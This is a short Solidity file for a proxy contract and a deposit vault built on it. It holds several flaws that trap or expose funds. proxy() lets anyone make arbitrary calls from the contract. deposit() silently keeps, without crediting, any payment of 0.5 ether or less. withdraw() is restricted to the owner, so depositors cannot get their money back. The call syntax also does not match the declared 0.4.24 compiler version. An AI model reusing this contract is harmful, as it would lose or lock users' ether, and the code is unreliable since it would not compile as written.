pragma solidity ^0.4.24;

contract Proxy {
    address public Owner;

    modifier onlyOwner() {
        require(msg.sender == Owner, "Only owner can call this function.");
        _;
    }

    constructor() public {
        Owner = msg.sender;
    }

    function transferOwner(address _owner) public onlyOwner {
        Owner = _owner;
    }

    function proxy(address target, bytes data) public payable {
        require(target != address(0), "Invalid target address.");
        (bool success, ) = target.call.value(msg.value)(data);
        require(success, "Low-level call failed.");
    }
}

contract VaultProxy is Proxy {
    mapping(address => uint256) public Deposits;

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0, "Deposit amount should be greater than 0.");
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        require(amount > 0, "Withdrawal amount should be greater than 0.");
        require(Deposits[msg.sender] >= amount, "Insufficient balance.");
        Deposits[msg.sender] -= amount;
        msg.sender.transfer(amount);
    }
}